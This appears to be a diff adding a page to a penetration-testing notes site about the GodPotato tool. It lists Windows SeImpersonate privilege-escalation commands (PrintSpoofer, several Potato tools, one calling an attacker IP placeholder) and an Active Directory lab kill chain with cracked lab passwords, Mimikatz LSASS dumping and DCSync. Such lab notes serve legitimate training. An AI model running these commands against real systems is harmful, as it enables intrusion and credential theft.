@@ -1,0 +1,85 @@
+---
+title: "GodPotato"
+sidebarTitle: "GodPotato"
+description: "Commands and examples collected from your GodPotato notes."
+keywords: ["GodPotato", "GodPotato-NET4.exe"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/godpotato.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=godpotato) · [All tools](/index)
+
+## B. Abuse SeImpersonatePrivilege → SYSTEM (no UAC needed) — the clean HTB move
+
+**Notebook example**
+
+```cmd
+.\PrintSpoofer64.exe -i -c cmd.exe
+:: or, very reliable on Server 2019:
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"     :: -> nt authority\system
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Notebook recipes
+
+2 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+
+<AccordionGroup>
+
+<Accordion title="🗺️ The kill chain (this assessment)">
+
+### 🗺️ The kill chain (this assessment)
+
+**Active Directory Attack Path: Worked Lab**
+
+```text
+OSINT (Betty Jayde)
+   ↓  namebuster  → username list
+Password spraying (Hydra, SSH)
+   ↓  jbetty : Texas123!@#
+SSH foothold (DMZ01)
+   ↓  chisel / ligolo pivot into 172.16.119.0/24
+Credential discovery (.bash_history)
+   ↓  hwilliam : dealer-screwed-gym1
+SMB share looting (FILE01)
+   ↓  Employee-Passwords_OLD.psafe3
+Crack the vault (pwsafe2john + john)
+   ↓  bdavid, stom (OLD), hwilliam
+BloodHound → bdavid = local admin on JUMP01 ; stom ∈ Domain Admins
+   ↓
+RDP to JUMP01 as bdavid (local admin)
+   ↓  SeImpersonate → SYSTEM  (PrintSpoofer / GodPotato)
+Mimikatz → LSASS → stom's CURRENT password
+   ↓  stom : calves-warp-learning1  (Domain Admin)
+DCSync against DC01
+   ↓  Administrator NTLM + krbtgt
+FULL DOMAIN COMPROMISE
+```
+
+</Accordion>
+
+<Accordion title="A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)">
+
+### A. SeImpersonate / SeAssignPrimaryToken → SYSTEM (Potato)
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+:: PrintSpoofer (uses the print spooler / RPC)
+.\PrintSpoofer64.exe -i -c cmd.exe
+:: GodPotato (DCOM; very reliable on Server 2016–2022) — pick the .NET version present
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"           :: -> nt authority\system
+:: alternatives if those are blocked:
+.\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"
+.\RoguePotato.exe -r <KALI_IP> -e "cmd.exe" -l 9999
+.\EfsPotato.exe "cmd /c whoami"
+```
+
+</Accordion>
+
+</AccordionGroup>
